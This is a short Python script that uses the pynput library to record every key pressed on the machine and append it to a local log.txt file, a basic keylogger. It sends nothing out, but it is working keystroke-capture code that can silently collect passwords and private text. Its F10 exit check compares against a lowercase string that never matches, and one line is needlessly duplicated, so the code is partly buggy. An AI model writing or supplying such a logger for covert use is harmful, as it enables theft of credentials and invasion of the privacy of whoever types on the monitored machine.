from pynput.keyboard import Listener


def key_press(key):
    key = str(key)
    if key == "key.f10":
        raise SystemExit(0)
    key = key.replace("'", "")

    if key == "Key.space":
        key = " "
    if key == "Key.enter":
        key = "\n"
    if key == "Key.enter":
        key = "\n"

    f = open("log.txt", "a", encoding="utf-8")
    f.write(key)
    f.close()


obj = Listener(on_press=key_press)
obj.start()
obj.join()
